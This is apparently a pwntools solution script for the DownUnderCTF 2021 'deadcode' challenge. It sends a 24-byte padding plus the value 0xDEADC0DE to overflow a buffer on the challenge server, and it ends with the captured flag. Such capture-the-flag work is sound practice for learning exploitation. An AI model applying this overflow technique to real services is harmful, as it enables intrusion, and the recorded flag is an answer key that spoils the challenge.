from pwn import *
h,p = 'pwn-2021.duc.tf', 31916
p = remote(h,p)
#p = process("./deadcode")
exp = "A"*24+p64(0xDEADC0DE)
p.sendline(exp)
p.interactive()
DUCTF{y0u_br0ught_m3_b4ck_t0_l1f3_mn423kcv}
